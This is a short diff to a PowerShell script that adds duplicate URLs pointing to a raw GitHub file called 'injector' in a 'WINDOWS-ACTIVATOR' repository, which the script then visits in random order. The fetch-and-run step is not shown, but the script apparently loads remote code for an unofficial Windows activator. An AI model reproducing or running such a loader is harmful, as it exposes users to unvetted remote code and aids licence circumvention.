@@ -6,6 +6,8 @@ $ErrorActionPreference = "Stop"
 
 $URLs = @(
 'https://raw.githubusercontent.com/CtorW/WINDOWS-ACTIVATOR/refs/heads/main/injector'
+'https://raw.githubusercontent.com/CtorW/WINDOWS-ACTIVATOR/refs/heads/main/injector'
+'https://raw.githubusercontent.com/CtorW/WINDOWS-ACTIVATOR/refs/heads/main/injector'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
